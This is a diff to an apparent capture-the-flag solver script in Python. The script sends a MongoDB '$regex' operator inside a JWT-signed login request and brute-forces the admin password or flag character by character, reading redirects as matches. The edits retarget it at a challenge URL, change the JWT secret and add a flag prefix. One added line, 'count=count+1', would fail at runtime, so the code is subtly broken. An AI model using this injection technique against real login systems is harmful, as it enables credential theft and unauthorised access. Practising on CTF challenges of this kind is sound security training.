@@ -1,16 +1,18 @@
 import requests
 import jwt
+import time
+url='CHALLENGE URL'
+alnum="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
 
-url='http://localhost:8000'
-alnum="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
 foundpass = False
 
 def makereq(regex):
+    count=count+1
     data={
         "name" : "admin",
         "password" : {"$regex" : regex}
     }
-    encoded = jwt.encode(data, "password", algorithm="HS256")
+    encoded = jwt.encode(data, "password1", algorithm="HS256")
 
     a=encoded.decode('ascii')
 
@@ -20,7 +22,7 @@ def makereq(regex):
     print( regex ,res.status_code)
     return res
 
-password="^"
+password="^p_ctf{"
 while foundpass != True :
     for c in alnum:
         testpass = password + c
@@ -28,7 +30,7 @@ while foundpass != True :
         if(len(response.history) != 0):
             print(f"PASSED {testpass}")
             password = password + c
-            testpass=testpass+"$"
+            testpass=testpass+"}$"
             response = makereq(testpass)
             if(len(response.history) != 0):
                 foundpass=True
